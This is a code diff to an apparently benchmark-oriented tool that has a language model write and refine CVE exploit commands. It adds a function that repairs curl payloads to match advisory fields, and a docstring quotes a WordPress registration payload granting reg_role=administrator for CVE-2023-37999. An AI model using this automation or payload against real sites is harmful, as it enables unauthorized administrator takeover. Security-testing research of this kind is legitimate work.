@@ -597,6 +597,14 @@ def _vc_needs_input_field(name) -> bool:
     return bool(m and m.needs_input_field(name))
 
 
+def _vc_password_fields(name):
+    m = _vc()
+    try:
+        return list(m.password_fields(name)) if m else []
+    except Exception:  # noqa: BLE001
+        return []
+
+
 def _vc_account_fields(name):
     m = _vc()
     try:
@@ -641,6 +649,131 @@ def _substitute_graded_account(command, account, fields):
         if m and m.group(2) != acct:
             return cmd[:m.start(2)] + acct + cmd[m.end(2):], field
     return cmd, None
+
+
+def _payload_field_synonym(a, b) -> bool:
+    """Two field names for the same thing: reg_name/name, reg_email/email.
+
+    Apps prefix their registration fields (`reg_`, `user_`, `usr_`) and the
+    model routinely drops the prefix. Comparing stripped names needs no
+    synonym table and generalises past the one app that exposed it.
+    """
+    def _bare(x):
+        x = str(x or "").strip().lower()
+        for pre in ("reg_", "user_", "usr_", "u_"):
+            if x.startswith(pre) and len(x) > len(pre):
+                return x[len(pre):]
+        return x
+    return bool(a) and bool(b) and _bare(a) == _bare(b)
+
+
+def _align_payload_with_advisory(command, payload_hint, graded_account, account_fields,
+                                 endpoint=None, goal_overrides=None):
+    """Make the dispatched command carry the ADVISORY's fields, with the GOAL's
+    account. Returns (command, [notes]).
+
+    The per-field model: the advisory names the fields and their correct values
+    (it is the spec for exercising the vulnerability), and the goal overrides
+    exactly one of them — the account it grades. Nothing else needs a lookup
+    table; `reg_role=administrator` is already the advisory's own literal.
+
+    CVE-2023-37999, 2026-10-24. The chain was correct end to end and the target
+    still refused:
+
+        advisory   : action=…&reg_name=…&reg_password=…&reg_email=…&reg_role=administrator
+        dispatched : action, email, password, reg_role, username
+        response   : {"registerauth":false,"message":"Username, Password and E-Mail are required"}
+
+    `action` and `reg_role` survived; the three the handler validates did not,
+    so it rejected every request before reaching the vulnerable code — while
+    the same endpoint had already created 37 administrator accounts from
+    correctly-shaped requests. A field the model renamed is a field the app
+    cannot see.
+
+    Adds only what is MISSING, reusing the command's own value for a renamed
+    field (`password=X` -> `reg_password=X`) so a working value is not thrown
+    away. Never removes anything: the goal is to make the request valid, not
+    to rewrite the model's approach.
+    """
+    import re as _re
+    cmd = str(command or "")
+    hint = str(payload_hint or "")
+    if not cmd or "=" not in hint:
+        return cmd, []
+    from urllib.parse import parse_qsl
+    try:
+        advisory = [(k, v) for k, v in parse_qsl(hint, keep_blank_values=True)]
+    except Exception:  # noqa: BLE001
+        return cmd, []
+    if not advisory:
+        return cmd, []
+    present = {m.group(1) for m in _re.finditer(r"(?<![\w-])([A-Za-z_][\w-]*)=", cmd)}
+    acct_fields = {str(f).lower() for f in (account_fields or [])}
+    # {lowercased field name -> the value the GOAL requires}. The account is
+    # one of these; on a graded target the PASSWORD is another, because the
+    # grader proves the escalation by logging in with the credentials it
+    # published. CVE-2023-37999: our account was named `username`, held
+    # wp_user_level=10, and scored zero because its password was generated.
+    overrides = {str(k).lower(): v for k, v in (goal_overrides or {}).items() if v}
+    for f in acct_fields:
+        if graded_account:
+            overrides.setdefault(f, graded_account)
+    notes, additions = [], []
+    # `cmd` may be rewritten in place below, so capture additions against the
+    # evolving string rather than the original.
+    for field, literal in advisory:
+        if field in present:
+            # Present but carrying the wrong value for a goal-required field:
+            # rewrite in place. Adding a duplicate would leave the first
+            # occurrence winning in most parsers.
+            want = overrides.get(field.lower())
+            if want:
+                m2 = _re.search(r"(?<![\w-])%s=([^&\"'\s]*)" % _re.escape(field), cmd)
+                if m2 and m2.group(1) != want:
+                    cmd = cmd[:m2.start(1)] + want + cmd[m2.end(1):]
+                    notes.append("%s (goal value)" % field)
+            continue
+        # a renamed twin already in the command keeps its value
+        twin = next((p for p in present if _payload_field_synonym(p, field)), None)
+        if twin:
+            m = _re.search(r"(?<![\w-])%s=([^&\"'\s]*)" % _re.escape(twin), cmd)
+            value = m.group(1) if m else literal
+        elif field.lower() in overrides:
+            value = overrides[field.lower()]
+        else:
+            value = literal
+        if field.lower() in overrides:
+            value = overrides[field.lower()]   # the goal always wins
+        additions.append("%s=%s" % (field, value))
+        notes.append("%s (from %s)" % (field, "advisory" if not twin else "renamed " + twin))
+    if not additions:
+        return cmd, []
+    # Append to the payload of the request that targets the EXPLOIT ENDPOINT.
+    #
+    # Taking the last -d put the advisory's fields on the wrong request: a
+    # three-stage chain ends with the LOGIN, so `reg_name` landed on
+    # wp-login.php while the registration kept the renamed fields and the
+    # handler went on rejecting it (2026-10-24). The fields have to reach the
+    # vulnerable handler, not merely the command.
+    _cands = list(_re.finditer(r"(--data-urlencode|--data|-d)\s+(['\"])(.*?)\2", cmd))
+    if not _cands:
+        return cmd, []
+    m = None
+    ep = str(endpoint or "").strip()
+    if ep:
+        for c in _cands:
+            # the URL of this curl: up to the next command separator
+            tail = cmd[c.end():]
+            seg = _re.split(r"[;&|]\s|\s&&\s", tail, 1)[0]
+            if ep in seg:
+                m = c
+                break
+    if m is None:
+        m = _cands[-1]          # no endpoint to match: previous behaviour
+    body_end = m.end(3)
+    joined = "&".join(additions)
+    sep = "" if cmd[body_end - 1:body_end] in ("", "&") else "&"
+    return cmd[:body_end] + sep + joined + cmd[body_end:], notes
 
 
 def _graded_account_used_as_value(command, account) -> bool:
@@ -31127,7 +31260,8 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
                     recon_source_used=None, arjun_discovered=None,
                     focused_urls_from_body=None, resolved_ids=None, gather_facts=None,
                     prior_cmd_signatures=None, vuln_class_override=None,
-                    tried_classes=None, plan=None, gather_manifest=None):
+                    tried_classes=None, plan=None, gather_manifest=None,
+                    strategy=None):
     """Increment 2: run the PoC against the target; on failure, refine via the LLM,
     re-run — up to max_iters. Verbose trail -> filesystem.
 
@@ -31405,6 +31539,7 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
         # waiting for the one run where the profile read fails — the class
         # tests/test_unbound_names.py exists to catch.
         _bm_vc = ""
+        import re as _re_mod
         try:
             # The class from THIS RUN's manifest. `vuln_class_override` is set
             # only on a chain-fallback re-synth, so using it alone passed ""
@@ -31532,8 +31667,41 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
                     # CVE; the model is what produced the throwaway name, so
                     # it is not the thing to ask about fixing it. Inline, no
                     # LLM, same precedent as the timing-assertion repair.
+                    #
+                    # PER-FIELD, AGAINST THE GOAL: the advisory names the
+                    # fields and their correct values; the goal overrides the
+                    # one field it grades. Align first — a renamed field is
+                    # invisible to the app, and adding it back is what makes
+                    # the account substitution reach the handler at all.
+                    _acct_fields = _vc_account_fields(_bm_vc)
+                    try:
+                        # `plan` is the SYNTH plan; `payload_hint` lives in the
+                        # STRATEGIST text. Reading the wrong one meant the
+                        # aligner never fired (advisory_fields_restored: 0).
+                        _hint_m = _re_mod.search(r"payload_hint=`([^`]*)`",
+                                                 str(strategy or "") + " " + str(plan or ""))
+                        if _hint_m:
+                            _creds = (_bm.get("challenge_creds") or {}) if isinstance(_bm, dict) else {}
+                            _goal_vals = {}
+                            _pw = str(_creds.get("password") or "").strip()
+                            if _pw:
+                                for _pf in _vc_password_fields(_bm_vc):
+                                    _goal_vals[_pf] = _pw
+                            _aligned, _added = _align_payload_with_advisory(
+                                command, _hint_m.group(1), _ga, _acct_fields,
+                                endpoint=(_man_facts or {}).get("endpoint_exists"),
+                                goal_overrides=_goal_vals)
+                            if _added:
+                                _poc_trace(run_id, "advisory_fields_restored", iteration=it,
+                                           extra={"added": _added, "account": _ga,
+                                                  "reason": "the app validates the advisory's "
+                                                            "field names; a renamed field is a "
+                                                            "field it cannot see"})
+                                command = _aligned
+                    except Exception as _ae:  # noqa: BLE001
+                        logging.debug("advisory field alignment skipped: %s", _ae)
                     _fixed, _fld = _substitute_graded_account(
-                        command, _ga, _vc_account_fields(_bm_vc))
+                        command, _ga, _acct_fields)
                     if _fld:
                         _poc_trace(run_id, "graded_identity_substituted", iteration=it,
                                    extra={"account": _ga, "field": _fld,
